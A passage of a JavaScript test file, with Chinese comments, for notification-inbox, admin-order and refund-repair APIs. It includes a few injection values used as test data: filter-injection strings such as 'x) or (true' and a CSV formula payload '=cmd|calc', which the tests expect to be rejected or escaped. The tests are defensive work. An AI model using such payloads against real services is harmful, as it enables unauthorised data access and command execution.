  { notification_id: mineRow.id, read_at: '2026-08-25T00:00:00Z', archived_at: null, dwell_ms: 2100 }
])
const mixed = await listNotifications(readMix, { userId: BUYER, group: 'default', rank: 0 }, {})
assert(mixed.body.items.find(n => n.id === mineRow.id).read === true, '有 read_at 就是已读')
assert(mixed.body.items.find(n => n.id === allRow.id).read === false,
  '没有 receipt 行的广播算未读——广播在没人碰过之前根本没有那一行')
assert(mixed.body.unread === 1, '未读数不能只查 receipts，否则恒为 0')
// receipts 查询必须按自己的 user_id 收窄。
const receiptQuery = readMix.calls.find(c => c.table === 'notification_receipts')
assert(receiptQuery.filters.user_id === BUYER, '只读自己的已读记录')
assert(Array.isArray(receiptQuery.in.notification_id), '按这一页的 id 收窄，不是全表拉回来')

// 归档过的默认不出现，带 archived=true 时单独看。
const archivedMix = inboxDb([mineRow, allRow], [
  { notification_id: mineRow.id, read_at: null, archived_at: '2026-08-25T00:00:00Z', dwell_ms: 0 }
])
const openOnly = await listNotifications(archivedMix, { userId: BUYER, group: 'default', rank: 0 }, {})
assert(openOnly.body.items.length === 1 && openOnly.body.items[0].id === allRow.id,
  '归档过的默认不出现，否则手动归档等于没用')
const archivedOnly = await listNotifications(
  inboxDb([mineRow, allRow], [{ notification_id: mineRow.id, read_at: null, archived_at: 'x', dwell_ms: 0 }]),
  { userId: BUYER, group: 'default', rank: 0 }, { archived: 'true' })
assert(archivedOnly.body.items.length === 1 && archivedOnly.body.items[0].id === mineRow.id,
  'archived=true 时只看归档的')

// 分页上限：limit 要被夹住，否则一个请求能把整张表拉走。
const bigLimit = inboxDb([allRow])
await listNotifications(bigLimit, { userId: BUYER, group: 'default', rank: 0 }, { limit: 9999 })
assert(bigLimit.calls.find(c => c.table === 'notifications').limit === 100, 'limit 上限 100')
const zeroLimit = inboxDb([allRow])
await listNotifications(zeroLimit, { userId: BUYER, group: 'default', rank: 0 }, { limit: 0 })
assert(zeroLimit.calls.find(c => c.table === 'notifications').limit === 20, 'limit=0 退回默认值')
const beforeDb = inboxDb([allRow])
await listNotifications(beforeDb, { userId: BUYER, group: 'default', rank: 0 }, { before: '2026-08-24T00:00:00Z' })
assert(beforeDb.calls.find(c => c.table === 'notifications').lt.created_at === '2026-08-24T00:00:00Z',
  'before 走 created_at 的 lt')

// 未读数：待处理要单独给一个数，否则全读过之后那三条等着批的退款不再提醒任何人。
const countDb = inboxDb([mineRow, adminRow, allRow], [
  { notification_id: adminRow.id, read_at: '2026-08-25T00:00:00Z', archived_at: null }
])
const counted = await unreadCount(countDb, { userId: BUYER, group: 'admin', rank: 999 })
assert(counted.body.unread === 2, '两条没读')
assert(counted.body.pending === 1, '读过但没处理的仍然算待处理')
const countArchived = await unreadCount(
  inboxDb([adminRow], [{ notification_id: adminRow.id, read_at: null, archived_at: 'x' }]),
  { userId: BUYER, group: 'admin', rank: 999 })
assert(countArchived.body.unread === 0 && countArchived.body.pending === 0, '归档过的不再计数')

// 标记已读：只能标自己看得见的。
const readDb = inboxDb([mineRow])
const readAnswer = await markRead(readDb, { userId: BUYER, group: 'default', rank: 0 },
  { ids: [mineRow.id], dwell_ms: 2100 })
assert(readAnswer.status === 200 && readAnswer.body.marked === 1, '标记成功')
const upsertCall = readDb.calls.find(c => c.table === 'notification_receipts' && c.op === 'upsert')
assert(upsertCall.upsertOpts.onConflict === 'notification_id,user_id',
  'upsert 要走主键冲突更新——广播在第一次被读之前没有那一行，先查后插会有并发缝')
assert(upsertCall.payload[0].user_id === BUYER && upsertCall.payload[0].read_at, '记下是谁什么时候读的')
assert(upsertCall.payload[0].dwell_ms === 2100, '§9.7 的停留时长要留下痕迹，两条触发路径要能分辨')
const dwellBad = inboxDb([mineRow])
await markRead(dwellBad, { userId: BUYER, group: 'default', rank: 0 }, { ids: [mineRow.id], dwell_ms: -5 })
assert(dwellBad.calls.find(c => c.op === 'upsert').payload[0].dwell_ms === 0, '负的停留时长归零')

// 标别人的通知：不能生效，而且不能靠答复差异问出那条通知存在。
const stealRead = inboxDb([theirRow])
const stolen = await markRead(stealRead, { userId: BUYER, group: 'default', rank: 0 }, { ids: [theirRow.id] })
assert(stolen.status === 404, '标不了别人的通知')
assert(!stealRead.calls.some(c => c.op === 'upsert'),
  '看不见就不能写 receipt——那不只是越权，还会让对方永远收不到那条提醒')
const mixedRead = inboxDb([mineRow, theirRow])
const partialAnswer = await markRead(mixedRead, { userId: BUYER, group: 'default', rank: 0 },
  { ids: [mineRow.id, theirRow.id] })
assert(partialAnswer.body.marked === 1 && partialAnswer.body.skipped === 1, '混着给时只标看得见的')
assert(mixedRead.calls.find(c => c.op === 'upsert').payload.length === 1, '写进去的只有一条')
for (const badIds of [undefined, null, [], ['x'], [123], {}]) {
  const answer = await markRead(inboxDb([mineRow]), { userId: BUYER, group: 'default', rank: 0 },
    { ids: badIds })
  assert(answer.status === 400, `ids=${JSON.stringify(badIds)} 应拒`)
}
const singleId = await markRead(inboxDb([mineRow]), { userId: BUYER, group: 'default', rank: 0 },
  { id: mineRow.id })
assert(singleId.status === 200, '单条也能标，不必包成数组')
const tooManyIds = await markRead(inboxDb([mineRow]), { userId: BUYER, group: 'default', rank: 0 },
  { ids: Array.from({ length: 101 }, () => mineRow.id) })
assert(tooManyIds.status === 400, '一次最多 100 条')

// 归档：待处理的不许归档，否则等于绕过 §9.6 的强制置顶。
const archDb = inboxDb([mineRow])
const archAnswer = await archiveNotifications(archDb, { userId: BUYER, group: 'default', rank: 0 },
  { ids: [mineRow.id] })
assert(archAnswer.status === 200 && archAnswer.body.archived === 1, '普通通知可以归档')
assert(archDb.calls.find(c => c.op === 'upsert').payload[0].archived_at, '记下归档时间')
const archPending = inboxDb([adminRow])
const blockedArch = await archiveNotifications(archPending, { userId: BUYER, group: 'admin', rank: 999 },
  { ids: [adminRow.id] })
assert(blockedArch.status === 409, '待处理的不许归档')
assert(!archPending.calls.some(c => c.op === 'upsert'), '被拦下时不写 receipt')
const stealArch = await archiveNotifications(inboxDb([theirRow]),
  { userId: BUYER, group: 'default', rank: 0 }, { ids: [theirRow.id] })
assert(stealArch.status === 404, '归档不了别人的通知')
const undoArch = inboxDb([mineRow])
const restored = await archiveNotifications(undoArch, { userId: BUYER, group: 'default', rank: 0 },
  { ids: [mineRow.id], undo: true })
assert(restored.body.restored === 1, '可以取消归档')
assert(undoArch.calls.find(c => c.op === 'upsert').payload[0].archived_at === null, '取消归档是把时间清空')

// or 条件是拼串，所以拼进去的 userId 必须先过形状校验。带逗号或右括号的值能改写整条过滤器，
// 而那条过滤器就是可见性判定。
for (const badUser of ['1,scope.eq.admin', 'x) or (true', '', null, undefined, 'not-a-uuid']) {
  const db = inboxDb([allRow])
  const answer = await listNotifications(db, { userId: badUser, group: 'default', rank: 0 }, {})
  assert(answer.status === 400, `userId=${JSON.stringify(badUser)} 不该被拼进 or 条件`)
  assert(db.calls.length === 0, '形状不对时一次库都不查')
  const counted2 = await unreadCount(inboxDb([allRow]), { userId: badUser, group: 'default', rank: 0 })
  assert(counted2.status === 400, '未读数那条路径同样要挡')
}

// §14：停留阈值必须由服务端给，前端写死 2000 的话管理员改了配置也不生效。
const inboxSet = await inboxSettings(recorder({
  site_settings: settings({
    notification_auto_archive_days: 45, notification_read_dwell_ms: 3500,
    notification_notify_browser: true, notification_notify_email: false
  })
}))
assert(inboxSet.body.auto_archive_days === 45 && inboxSet.body.read_dwell_ms === 3500, '配置如实返回')
assert(inboxSet.body.notify_browser === true && inboxSet.body.notify_email === false,
  '两个开关是独立的，可以同时开')

console.log('Notification inbox: OK')

// --- api/admin-orders.mjs (§12) ---------------------------------------------------------------------
// 这个接口的门槛是 rank ≥ 111，比其他所有订单接口都低（§12.2 确认过是有意的）。于是「返回了什么列」
// 变成一个安全问题而不只是功能问题：脱敏是这里唯一的保护，RLS 表达不了「这一列要打码」。

// 邮箱脱敏：首尾留字符、域名不遮。留中间几位等于没打，全打成星号则客服没法在电话里核对身份。
assert(maskEmail('zhangsan@example.com') === 'z******n@example.com', '中间遮掉，首尾和域名留着')
assert(maskEmail('ab@x.io') === 'a*@x.io', '两个字符的用户名也要遮掉一个')
assert(maskEmail('') === '', '空值不要变成一串星号')
assert(maskEmail('nobody-at-all') === 'n******l', '没有 @ 的字符串按普通文本遮')
assert(!maskEmail('zhangsan@example.com').includes('zhangsan'), '脱敏后不能还能读出原用户名')

// CSV：Excel 会把 = + - @ 开头的单元格当公式执行，而 sku_name / display_name 都是别处写入的可控字段。
{
  const csv = toCsv([{ a: '=cmd|calc', b: '含"引号"', c: '逗号,在里面' }], [
    { title: '列A', pick: r => r.a }, { title: '列B', pick: r => r.b }, { title: '列C', pick: r => r.c }
  ])
  assert(csv.startsWith('﻿'), '要有 BOM，否则 Excel 用本地代码页读 UTF-8，中文全是乱码')
  assert(csv.includes('"\'=cmd|calc"'), '以 = 开头的值要前置单引号，否则 Excel 当公式执行')
  assert(csv.includes('"含""引号"""'), '内部引号翻倍')
  assert(csv.includes('"逗号,在里面"'), '带逗号的值靠引号包住，不能把一格拆成两格')
  assert(csv.includes('\r\n'), 'CRLF 换行——Excel 对 LF-only 的 CSV 有时把整表读成一行')
}

const ORDER_AT = '2026-08-20T09:00:00Z'
const ORDER_ROW = {
  id: '11111111-2222-3333-4444-555555555555', user_id: BUYER, sku: 'aetherac-pro', sku_name: 'AetherAC 专业版',
  quantity: 1, status: 'paid', provider: 'payerurl', provider_order_id: 'PU-9', payment_reference: 'PAY-77',
  amount_minor: 9500, list_amount_minor: 12000, discount_minor: 2500, paid_amount_minor: 9500,
  currency: 'USD', paid_currency: 'USD', coupon_code: 'WELCOME', created_at: ORDER_AT, paid_at: ORDER_AT, updated_at: ORDER_AT
}
const ordersDb = (opts = {}) => recorder({
  orders: opts.orders ?? { data: [ORDER_ROW], error: null, count: 137 },
  payment_providers: { data: [{ id: 'payerurl' }, { id: 'stripe' }], error: null },
  user_profiles: { data: [{ user_id: BUYER, email: 'zhangsan@example.com', display_name: '张三' }], error: null },
  order_status_log: { data: opts.logs ?? [], error: null },
  refund_requests: { data: opts.refunds ?? [], error: null },
  artifacts: { data: null, error: null },
  site_settings: settings(opts.config ?? {})
})

// 列表：筛选、分页、总数。
{
  const db = ordersDb()
  const out = await listOrders(db, {
    status: 'paid', provider: 'payerurl', created_from: '2026-08-01', created_to: '2026-08-31',
    paid_from: '2026-08-05', limit: '25', offset: '50'
  }, { pageSize: 20 })
  assert(out.status === 200, '合法筛选要通过')
  const q = db.calls.find(c => c.table === 'orders')
  assert(q.selectOpts?.count === 'exact', "总数靠 { count: 'exact' }，漏掉它分页控件只会画出一页")
  assert(q.filters.status === 'paid' && q.filters.provider === 'payerurl', '状态和渠道各自成为等值条件')
  assert(q.gte.created_at.startsWith('2026-08-01') && q.lte.created_at.startsWith('2026-08-31'),
    '下单时间两端都夹上')
  assert(q.gte.paid_at.startsWith('2026-08-05') && !(q.lte && 'paid_at' in q.lte),
    '只填了支付时间的下界，就只加下界——另一端不该被补成 now')
  assert(q.range.from === 50 && q.range.to === 74, 'offset 50 取 25 条是 [50,74]，不是 [50,75]')
  assert(out.body.total === 137, '总数来自 count，不是本页条数')
  assert(!q.selected.includes('provider_payload'),
    '列表不查回调原文：那里面有渠道塞进来的买家邮箱和 IP，而这个接口 rank 111 就能调')
}

// 分页上限：前端传一个大数不能变成整表导出。
{
  const db = ordersDb()
  const out = await listOrders(db, { limit: '99999' }, { pageSize: 20, cap: 200 })
  assert(out.body.limit === 200, 'limit 被 cap 夹住')
  assert(db.calls[0].range.to === 199, 'range 跟着 cap，而不是跟着请求里的数字')
  const dflt = ordersDb()
  await listOrders(dflt, {}, { pageSize: 20 })
  assert(dflt.calls[0].range.to === 19, '不传 limit 时用 §14 的 order_list_page_size')
}

// §12.3 精确搜索：三个搜索项，形状不对就在查库之前拒掉。
{
  const byOrder = ordersDb()
  await listOrders(byOrder, { search: ORDER_ROW.id, search_field: 'order_no' }, { pageSize: 20 })
  assert(byOrder.calls[0].filters.id === ORDER_ROW.id, '订单号搜的是 id 等值')

  const byPay = ordersDb()
  await listOrders(byPay, { search: 'PAY-77', search_field: 'payment_id' }, { pageSize: 20 })
  assert(byPay.calls[0].or === 'payment_reference.eq.PAY-77,provider_order_id.eq.PAY-77',
    '支付 ID 要同时查两列：老订单的流水号在 provider_order_id 里，只查一列就永远搜不到')

  // 模糊搜索会让任何组织成员用一个字母把全表捞出来，那是枚举。所以 like 一律不许出现。
  const shapes = [
    ['order_no', 'not-a-uuid'], ['user_id', '1'], ['payment_id', 'PAY,scope.eq.admin'],
    ['payment_id', 'x) or (true'], ['payment_id', 'a'.repeat(129)], ['nope', ORDER_ROW.id]
  ]
  for (const [field, value] of shapes) {
    const db = ordersDb()
    const bad = await listOrders(db, { search: value, search_field: field }, { pageSize: 20 })
    assert(bad.status === 400, `${field}=${String(value).slice(0, 20)} 要被拒`)
    assert(db.calls.length === 0, '拒掉的搜索不该已经查过库——拼进 or 的东西必须先确认形状')
  }
}

// 状态和渠道也要按名单校验：渠道 id 是 text 主键，形状不受控。
{
  const badStatus = await listOrders(ordersDb(), { status: 'refunded_maybe' }, { pageSize: 20 })
  assert(badStatus.status === 400, '未知状态被拒')
  const badProvider = await listOrders(ordersDb(), { provider: 'wechat' }, { pageSize: 20 })
  assert(badProvider.status === 400 && badProvider.body.error.includes('wechat'), '未知渠道被拒且指名')
}

// 详情（§12.5）：商品快照、变更记录、下一步。
{
  const db = ordersDb({
    orders: { data: ORDER_ROW, error: null },
    logs: [{ id: 1, from_status: 'pending', to_status: 'paid', source: 'callback', note: '', created_at: ORDER_AT }],
    refunds: [{ id: 'r1', status: 'pending', amount_minor: 9500, currency: 'USD' }]
  })
  const out = await orderDetail(db, ORDER_ROW.id, { canModify: true })
  assert(out.status === 200, '详情要能读出来')
  assert(out.body.order.user_email === 'z******n@example.com', '详情里的联系方式同样脱敏')
  assert(out.body.order.user_email !== 'zhangsan@example.com', '不能因为是管理员就返回原文')
  assert(out.body.line.name === 'AetherAC 专业版', '商品名取订单上的快照')
  assert(out.body.line.coupon_code === 'WELCOME', '§5：用了券就显示券码')
  assert(out.body.logs.length === 1 && out.body.refunds.length === 1, '变更记录和退款记录都带上')
  assert(out.body.open_refund?.id === 'r1', 'pending 的申请算在途——操作区要据此把退款按钮画灰')
  const next = out.body.next_statuses
  assert(next.length === 1 && next[0].status === 'refund_pending', 'paid 的下一步只有一个')
  assert(next[0].via_refund === true, '这一步得走退款流程，前端要据此不画成普通状态按钮')

  const missing = await orderDetail(ordersDb({ orders: { data: null, error: null } }), ORDER_ROW.id, { canModify: true })
  assert(missing.status === 404, '不存在的订单是 404')
  const malformed = await orderDetail(ordersDb(), 'not-a-uuid', { canModify: true })
  assert(malformed.status === 400, '格式不对在查库前拒掉')
}

// 商品快照为空时（早于快照列的历史订单）才回落到 artifacts。
{
  const legacy = { ...ORDER_ROW, sku_name: '', sku_description: '' }
  const db = recorder({
    orders: { data: legacy, error: null },
    user_profiles: { data: [], error: null },
    order_status_log: { data: [], error: null },
    refund_requests: { data: [], error: null },
    artifacts: { data: { name: '旧商品名', description: '旧描述' }, error: null }
  })
  const out = await orderDetail(db, ORDER_ROW.id, { canModify: false })
  assert(out.body.line.name === '旧商品名', '空快照回落到 artifacts')
  assert(out.body.can_modify === false, 'can_modify 如实传下去，前端据此画灰按钮而不是隐藏按钮')

  // 有快照时不许去查 artifacts：商品改名后回头看这笔订单必须还是当时那份。
  const fresh = ordersDb({ orders: { data: ORDER_ROW, error: null } })
  await orderDetail(fresh, ORDER_ROW.id, { canModify: true })
  assert(!fresh.tables.includes('artifacts'), '有快照就不查商品表，否则订单记录会跟着商品定义一起变')
}

// §12.5 状态变更：必填说明、非法迁移被拒、并发保护。
{
  const okDb = ordersDb({ orders: [{ data: { id: ORDER_ROW.id, status: 'pending' }, error: null }, { data: [{ id: ORDER_ROW.id, status: 'cancelled' }], error: null }] })
  const done = await updateOrderStatus(okDb, { userId: ADMIN1, group: 'admin' }, {
    order_id: ORDER_ROW.id, status: 'cancelled', note: '渠道超时，买家已确认放弃'
  })
  assert(done.status === 200 && done.body.from === 'pending', '合法迁移通过并回报原状态')
  const upd = okDb.calls.find(c => c.table === 'orders' && c.op === 'update')
  assert(upd.filters.status === 'pending',
    "update 上要带 .eq('status', 原状态)——支付回调也在改这张表，不是只有两个人同时点才会撞")
  const logged = okDb.calls.find(c => c.table === 'order_status_log')
  assert(logged?.payload.source === 'admin' && logged.payload.note.includes('渠道超时'),
    '§12.4：来源记成 admin，说明原样入库')
  assert(logged.payload.actor_group === 'admin', '记下操作人所在的组，否则事后分不清是谁改的')

  const noNote = await updateOrderStatus(ordersDb(), { userId: ADMIN1, group: 'admin' }, { order_id: ORDER_ROW.id, status: 'cancelled' })
  assert(noNote.status === 400 && noNote.body.error.includes('变更说明'), '§12.5：说明必填')

  const illegal = await updateOrderStatus(
    ordersDb({ orders: { data: { id: ORDER_ROW.id, status: 'refunded' }, error: null } }),
    { userId: ADMIN1, group: 'admin' }, { order_id: ORDER_ROW.id, status: 'paid', note: '改回来' })
  assert(illegal.status === 409 && illegal.body.error.includes('终态'), '§12.5：非法迁移被拒且说明原因')

  // 抢不到行 = 别人先改了。这里必须是 409 而不是 200：返回 200 会让管理员以为改成功了。
  const raced = ordersDb({ orders: [{ data: { id: ORDER_ROW.id, status: 'pending' }, error: null }, { data: [], error: null }] })
  const lost = await updateOrderStatus(raced, { userId: ADMIN1, group: 'admin' }, {
    order_id: ORDER_ROW.id, status: 'failed', note: '渠道回报失败'
  })
  assert(lost.status === 409, '0 行受影响是 409')
  assert(!raced.tables.includes('order_status_log'), '没改动就不该留下一条说改了的审计')
}

// 退款相关的两个状态不能从订单详情直接点。放开等于给出一个「标成已退款但查不到申请」的入口。
for (const target of ['refund_pending', 'refunded']) {
  const db = ordersDb({ orders: { data: { id: ORDER_ROW.id, status: target === 'refunded' ? 'refund_pending' : 'paid' }, error: null } })
  const blocked = await updateOrderStatus(db, { userId: ADMIN1, group: 'admin' }, {
    order_id: ORDER_ROW.id, status: target, note: '手工改一下'
  })
  assert(blocked.status === 409 && blocked.body.error.includes('退款'),
    `${target} 必须走退款流程——直接改会绕过审批、二次确认和给用户的站内信`)
  assert(!db.tables.includes('order_status_log'), '被拒的操作不留审计')
}

// §12.4 导出：受 §14 的开关管，且有上限。
{
  const db = ordersDb({ orders: { data: [ORDER_ROW], error: null, count: 1 } })
  const out = await exportOrders(db, {}, { pageSize: 20 })
  assert(out.status === 200 && out.filename === `orders-${new Date().toISOString().slice(0, 10)}.csv`, '文件名带日期')
  assert(!/[0-9a-f]{8}-/.test(out.filename), '文件名里不放订单号或用户 ID：导出文件常常被直接转发')
  assert(out.csv.includes('z******n@example.com'), '导出的联系方式同样脱敏')
  assert(!out.csv.includes('zhangsan@example.com'), '导出是最容易外流的一份，绝不能带原始邮箱')
  assert(out.csv.includes('PAY-77') && out.csv.includes('WELCOME'), '§5 的支付 ID 和券码都在表里')
  assert(out.truncated === false, '没截断')

  const capped = await exportOrders(ordersDb({ orders: { data: [ORDER_ROW], error: null, count: 90000 } }), {}, { pageSize: 20 })
  assert(capped.truncated === true && capped.total === 90000,
    '被上限截断要如实说——否则拿着一份不完整的表去对账')

  const off = await exportOrders(ordersDb({ config: { order_export_enabled: false } }), {}, { pageSize: 20 })
  assert(off.status === 403, '开关关掉时是 403，不是一个空文件——空文件会被读成「这个月没订单」')
}

// 和 schema.sql 对齐：门槛数字和 §14 的键名都不许两边各写一份。
{
  const viewSql = schemaSql.match(/function private\.can_view_orders\(\)[\s\S]*?my_rank\(\) >= (\d+)/)
  assert(Number(viewSql[1]) === RANK.MEMBER,
    'can_view_orders 的阈值必须等于 RANK.MEMBER——SQL 松一档就是越权读，JS 松一档是界面能点接口报错')
  const updSql = schemaSql.match(/policy admin_orders_update on public\.orders[\s\S]{0,200}/)
  assert(/is_admin\(\)/.test(updSql[0]), 'orders 的 UPDATE 策略只给 admin，接口里的 canModify 跟着它')
  for (const key of ['order_list_page_size', 'order_export_enabled']) {
    assert(schemaSql.includes(`'${key}'`), `§14 的 ${key} 要在 schema 的 seed 里，否则配置界面改了也读不到`)
  }
  const logCols = schemaSql.match(/create table if not exists public\.order_status_log\(?[\s\S]*?\);/)
  for (const col of ['from_status', 'to_status', 'actor_group', 'source', 'note']) {
    assert(logCols[0].includes(col), `order_status_log 缺列 ${col}，logOrderStatus 写进去会报约束错`)
  }
  assert(/source .*check \(source in \([^)]*'admin'[^)]*\)\)/.test(logCols[0]),
    "source 的 check 里要有 'admin'，否则 §12.5 每次改状态都写不进审计")
}

console.log('Admin orders: OK')

// --- api/admin-refunds.mjs (§10.6 / §10.8) ---------------------------------------------------------
// 这一段盯的是两件事：谁能看、谁能改（读是 STAFF、写只有 admin，和 schema 里的策略一致），以及
// 「只写了一半」的那三种状态各自被算成哪一个补法。后者错一次就是把一笔没退出去的钱标成已退款。
const RFD = 'dddddddd-dddd-4ddd-8ddd-dddddddddddd'
const RFD_ORDER = '11111111-2222-3333-4444-555555555555'
const RFD_AT = '2026-08-01T00:00:00Z'
const REFUND_ROW = {
  id: RFD, order_id: RFD_ORDER, user_id: BUYER, status: 'pending', amount_minor: 9500, currency: 'USD',
  reason_code: '不好用', reason_detail: '和描述不符', evidence_paths: [], admin_note: '',
  initiated_by: BUYER, initiator_role: 'user', decided_by: null, decided_at: null, decision_note: '',
  transferred_to: null, escalated_at: null, reminded_at: null, executed_at: null, execution_note: '',
  created_at: RFD_AT, updated_at: RFD_AT
}
// 两套结果形状：看板列表用 .in() 一次取回多行，而 repair 是先 maybeSingle 读一行再 update。
// 同一个假 db 要能分别作答，所以 repair 那条路径显式说明自己是它。
const refundsDb = (opts = {}) => recorder({
  refund_requests: opts.refund_requests ?? (opts.repair
    ? [{ data: opts.refund ?? REFUND_ROW, error: null }, { data: [{ id: RFD }], error: null }]
    : { data: [opts.refund ?? REFUND_ROW], error: null, count: opts.count ?? 42 }),
  orders: opts.orders ?? (opts.repair
    ? [{ data: { ...ORDER_ROW, status: opts.orderStatus ?? 'paid' }, error: null }, { data: [{ id: RFD_ORDER }], error: null }]
    : { data: [{ ...ORDER_ROW, status: opts.orderStatus ?? 'paid' }], error: null }),
  user_profiles: { data: [{ user_id: BUYER, email: 'zhangsan@example.com', display_name: '张三', group_name: 'default' }], error: null },
  refund_audit_log: { data: opts.logs ?? [], error: null },
  site_settings: settings(opts.config ?? {})
})

// planRepair 的三种情况，各自只有一个合理的补法。判断只看订单状态——那是这笔钱的唯一事实来源。
{
  const approvedPaid = await repairRefund(refundsDb({ repair: true, refund: { ...REFUND_ROW, status: 'approved' }, orderStatus: 'paid' }),
    { userId: ADMIN1, group: 'admin' }, { refund_id: RFD, action: 'repair_order_move' })
  assert(approvedPaid.status === 200 && approvedPaid.body.order_status === 'refund_pending',
    '已批准但订单还是已支付：补的是订单，而不是把申请推到别的状态')

  const doneStuck = await repairRefund(refundsDb({ repair: true, refund: { ...REFUND_ROW, status: 'executing' }, orderStatus: 'refunded' }),
    { userId: ADMIN1, group: 'admin' }, { refund_id: RFD, action: 'repair_settle_completed' })
  assert(doneStuck.status === 200 && doneStuck.body.status === 'completed',
    '订单已退款、申请停在执行中：补成已完成，不要再退一次款')

  const failStuck = await repairRefund(refundsDb({ repair: true, refund: { ...REFUND_ROW, status: 'executing' }, orderStatus: 'paid' }),
    { userId: ADMIN1, group: 'admin' }, { refund_id: RFD, action: 'repair_settle_failed' })
  assert(failStuck.status === 200 && failStuck.body.status === 'failed',
    '订单退回已支付说明钱没退出去，终态必须是失败而不是已完成——后者是把没退的钱记成退了')
}

// actionsFor / executeBlock：界面上亮着的按钮和接口愿意接受的动作必须是同一份判断。
{
  const acts = (status, orderStatus) => actionsFor({ status }, { status: orderStatus })
  assert(acts('pending', 'paid').join(',') === 'approve,reject,transfer', '待审批的三个按钮')
  assert(acts('approved', 'refund_pending').includes('execute_success'), '订单在退款中才能登记结果')
  assert(!acts('approved', 'paid').includes('execute_success'),
    '订单还是已支付时不能登记退款结果——那会把一笔没进退款流程的订单标成已退款')
  assert(acts('executing', 'refund_pending').includes('execute_failed'),
    '停在执行中的可以接着走完，所以按钮还在')
  assert(acts('completed', 'refunded').length === 0, '终态没有按钮')
  assert(executeBlock({ status: 'approved' }, { status: 'paid' }).includes('补齐订单状态'),
    '按钮不亮时要写出为什么，否则下一个人的处置办法是「再退一次款」')
  assert(executeBlock({ status: 'executing' }, { status: 'refunded' }).includes('不要再退一次款'),
    '这一句是这一页存在的理由：订单页和收件箱都看不出中间那一步没写完')
  assert(executeBlock({ status: 'pending' }, { status: 'paid' }) === '', '还没批准的不用解释执行为什么点不了')
  assert(executeBlock({ status: 'approved' }, { status: 'refund_pending' }) === '', '能点的时候不要挂一句说明')
}

// repair 的三道门：非 admin、状态本来就一致、以及前端看到的情况已经过期。
{
  for (const group of ['cs', 'postsale', 'presale', 'coworker', 'read', 'default']) {
    const db = refundsDb({ repair: true, refund: { ...REFUND_ROW, status: 'executing' }, orderStatus: 'refunded' })
    const out = await repairRefund(db, { userId: ADMIN1, group }, { refund_id: RFD })
    assert(out.status === 403, `${group} 不能补齐退款记录——这是在改钱的记录`)
    assert(db.calls.length === 0, `${group} 被拒时不该产生任何数据库调用`)
  }
  const consistent = await repairRefund(refundsDb({ repair: true, refund: { ...REFUND_ROW, status: 'approved' }, orderStatus: 'refund_pending' }),
    { userId: ADMIN1, group: 'admin' }, { refund_id: RFD })
  assert(consistent.status === 409, '两边一致时没有可补的，不能凭空改一个状态')
  const stale = await repairRefund(refundsDb({ repair: true, refund: { ...REFUND_ROW, status: 'executing' }, orderStatus: 'refunded' }),
    { userId: ADMIN1, group: 'admin' }, { refund_id: RFD, action: 'repair_settle_failed' })
  assert(stale.status === 409 && stale.body.expected === 'repair_settle_completed',
    '看板开了十分钟，情况变了就让人重新看一眼，而不是默默执行另一件他没打算做的事')
  for (const bad of [undefined, '', 'abc', 123]) {
    const out = await repairRefund(refundsDb(), { userId: ADMIN1, group: 'admin' }, { refund_id: bad })
    assert(out.status === 400, `refund_id=${JSON.stringify(bad)} 应拒`)
  }
}

// 补齐时的并发保护和审计。这两句 .eq 是全部的保护：Vercel 上没有事务。
{
  const db = refundsDb({
    repair: true, refund: { ...REFUND_ROW, status: 'approved' },
    orders: [{ data: { ...ORDER_ROW, status: 'paid' }, error: null }, { data: [{ id: RFD_ORDER }], error: null }]
  })
  await repairRefund(db, { userId: ADMIN1, group: 'admin' }, { refund_id: RFD, note: '渠道后台已确认' })
  const upd = db.calls.find(c => c.table === 'orders' && c.op === 'update')
  assert(upd.filters.status === 'paid', '订单的 update 要求它此刻还是已支付，慢的那次影响 0 行')
  assert(upd.payload.status === 'refund_pending', '补的就是批准时该做的那一步')
  const olog = db.calls.find(c => c.table === 'order_status_log').payload
  assert(olog.from_status === 'paid' && olog.to_status === 'refund_pending' && olog.source === 'admin',
    '订单侧要留状态日志，三个月后对账的人要看得到这一步是人工补的')
  assert(olog.note.includes('渠道后台已确认'), '操作人写的原因要留着')
  const alog = db.calls.find(c => c.table === 'refund_audit_log').payload
  assert(alog.action === 'repair_order_move' && alog.to_status === 'approved',
    '申请状态没动，所以 from/to 都是 approved——留空会让这一行看起来像一次失败的迁移')
  assert(!db.calls.some(c => c.table === 'notifications'),
    '不发站内信：批准通知早发过了，再发一条只会让用户以为又发生了一次退款')

  const lost = refundsDb({
    repair: true, refund: { ...REFUND_ROW, status: 'approved' },
    orders: [{ data: { ...ORDER_ROW, status: 'paid' }, error: null }, { data: [], error: null }]
  })
  const lostOut = await repairRefund(lost, { userId: ADMIN1, group: 'admin' }, { refund_id: RFD })
  assert(lostOut.status === 409, '订单被别人抢先改过就报 409')
  assert(!lost.tables.includes('order_status_log'), '订单没动就不写日志')

  const settleDb = refundsDb({
    repair: true, refund: { ...REFUND_ROW, status: 'executing' }, orderStatus: 'refunded'
  })
  await repairRefund(settleDb, { userId: ADMIN1, group: 'admin' }, { refund_id: RFD })
  const rUpd = settleDb.calls.find(c => c.table === 'refund_requests' && c.op === 'update')
  assert(rUpd.filters.status === 'executing', '申请的 update 要求它此刻还在执行中')
  assert(rUpd.payload.status === 'completed', '补成已完成')
  assert(!('execution_note' in rUpd.payload),
    '不覆盖 execution_note：refund-execute 当时写的东西是当时的事实，补记的原因进审计轨迹')
  assert(!settleDb.calls.some(c => c.table === 'orders' && c.op === 'update'), '订单已经在它该在的地方，不要动')
}

// 列表的筛选、分页和超时。
{
  const db = refundsDb()
  const out = await listRefunds(db, { status: 'open', initiator_role: 'cs', order_id: RFD_ORDER, limit: '25', offset: '50' },
    { timeoutHours: 48 })
  assert(out.status === 200 && out.body.total === 42, '总数来自 count')
  const q = db.calls.find(c => c.table === 'refund_requests')
  assert(q.selectOpts?.count === 'exact', "分页要靠 { count: 'exact' } 拿总数")
  assert(q.in.status.length === 4 && !q.in.status.includes('completed'),
    'open 展开成四个在途状态，和 schema 里 one_open_refund_per_order 的谓词一致')
  assert(q.filters.initiator_role === 'cs' && q.filters.order_id === RFD_ORDER, '两个等值条件各自成立')
  assert(q.range.from === 50 && q.range.to === 74, 'offset 50 取 25 条是 [50,74]')
  assert(q.order.col === 'created_at' && q.order.ascending === false, '最新的申请排在前面')

  const capped = await listRefunds(refundsDb(), { limit: '99999' }, { timeoutHours: 48 })
  assert(capped.body.limit === 200, 'limit 被 cap 夹住，前端传个大数不能变成整表导出')
  for (const [query, label] of [
    [{ status: 'maybe' }, '状态'], [{ initiator_role: 'boss' }, '发起方'],
    [{ order_id: 'not-a-uuid' }, '订单号'], [{ user_id: '1' }, '用户 ID']
  ]) {
